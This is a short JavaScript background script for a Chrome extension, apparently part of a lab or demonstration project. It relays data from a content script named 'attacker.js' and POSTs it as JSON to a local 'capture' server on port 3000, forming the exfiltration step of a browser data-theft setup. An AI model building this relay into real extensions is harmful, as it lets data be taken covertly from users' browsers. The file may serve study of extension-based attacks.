// Listen for messages sent from the attacker.js script inside the tab.
chrome.runtime.onMessage.addListener((message, sender) => {
    
    // If the message is our "UPLOAD_DATA" packet...
    if (message.action === "UPLOAD_DATA") {
        
        // We use 'fetch' to POST the data to our local server on Port 3000.
        fetch('http://localhost:3000/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message.data)
        })
        .then(() => console.log("Packet sent to Server."))
        .catch(err => console.error("Error: Is your 'node server.js' running?", err));
    }
});
